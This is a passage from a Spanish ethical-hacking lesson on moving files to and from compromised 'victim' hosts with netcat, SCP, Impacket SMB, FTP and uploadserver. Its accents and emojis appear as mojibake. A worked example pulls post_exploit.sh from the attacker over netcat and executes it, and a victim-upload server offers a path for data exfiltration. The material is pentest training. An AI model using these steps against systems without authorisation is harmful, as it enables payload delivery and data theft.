##### ‚ñ∂Ô∏è Uso:

**Desde la m√°quina que env√≠a el archivo:**

```bash
nc -lvnp 4444 < archivo.txt
```

**Desde la m√°quina que lo recibe:**

```bash
nc TU-IP 4444 > archivo.txt
```

üí° Tambi√©n puedes usarlo para enviar comandos, scripts, ejecutables, etc.

---

#### 3. üîê SCP (Secure Copy)

Usa **SSH** para transferencias **cifradas**.

##### üì¶ Instalaci√≥n:

```bash
sudo apt install openssh-client
```

##### ‚ñ∂Ô∏è Uso:

**Enviar archivo a una m√°quina remota:**

```bash
scp archivo.txt usuario@IP:/ruta/destino/
```

**Recibir archivo de una m√°quina remota:**

```bash
scp usuario@IP:/ruta/archivo.txt .
```

---

#### 4. üìÇ SMB (smbserver.py de Impacket)

Ideal para compartir archivos a v√≠ctimas Windows.

##### üì¶ Instalaci√≥n:

```bash
pip install impacket
```

##### ‚ñ∂Ô∏è Uso:

**En tu m√°quina (compartir carpeta):**

```bash
impacket-smbserver share /ruta/del/archivo -smb2support
```

**Desde Windows (cliente):**

```powershell
copy \\IP\share\archivo.exe C:\Users\victim\
```

---

#### 5. üåç FTP (con PyFTPdLib o vsftpd)

R√°pido si necesitas subir/bajar archivos grandes o m√∫ltiples archivos.

##### üì¶ Instalaci√≥n (en Kali o Linux):

```bash
pip install pyftpdlib
```

##### ‚ñ∂Ô∏è Uso:

**Servidor FTP:**

```bash
python3 -m pyftpdlib -p 21
```

**Cliente FTP:**

```bash
ftp IP
# Luego usa: get archivo.txt
```

---

#### 6. üîÄ HTTP Upload (recepci√≥n desde v√≠ctima)

Puedes usar herramientas como `upload-server` para **recibir archivos desde otra m√°quina**.

##### üì¶ Instalaci√≥n:

```bash
pip install uploadserver
```

##### ‚ñ∂Ô∏è Uso:

```bash
uploadserver
```

La v√≠ctima sube archivos v√≠a navegador o `curl`.

---

### üß† Resumen R√°pido

| T√©cnica                    | Necesitas en v√≠ctima | Ventaja clave          |
| -------------------------- | -------------------- | ---------------------- |
| Python HTTP + curl/wget    | curl o wget          | Muy simple y r√°pido    |
| Netcat                     | netcat               | Sirve sin internet     |
| SCP                        | SSH                  | Seguro y cifrado       |
| SMB (Impacket)             | Windows/Linux        | Ideal para Windows     |
| FTP                        | Cliente FTP          | Transferencia m√∫ltiple |
| HTTP Upload (uploadserver) | Navegador o curl     | V√≠ctima env√≠a archivos |

---

### üß™ Ejemplo Completo Paso a Paso

#### üéØ Objetivo:

Enviar un script `post_exploit.sh` desde tu m√°quina Kali a una v√≠ctima Linux **que no tiene `wget`, `curl` ni Python**, pero s√≠ tiene **Netcat**.

---

#### ‚úÖ Paso 1: En Kali (servidor, env√≠a archivo)

```bash
nc -lvnp 5555 < post_exploit.sh
```

---

#### ‚úÖ Paso 2: En la m√°quina v√≠ctima (cliente, recibe archivo)

```bash
nc TU-IP 5555 > post_exploit.sh
chmod +x post_exploit.sh
./post_exploit.sh
```

---

#### ‚úÖ Resultado:

- El script `post_exploit.sh` ahora est√° en la m√°quina v√≠ctima.
- Fue transferido usando solo Netcat.
- No fue necesario acceso a Internet.

---

[üîº](#√≠ndice)

---

| **Inicio**         | **atr√°s 5**                                    | **Siguiente 7**                                            |
| ------------------ | ---------------------------------------------- | ---------------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./5_5_Deteccion_y_Evasion_de_defensas.md) | [‚è©](./5_7_Hacking_Etico_en_entornos_reales_Amazon_AWS.md) |
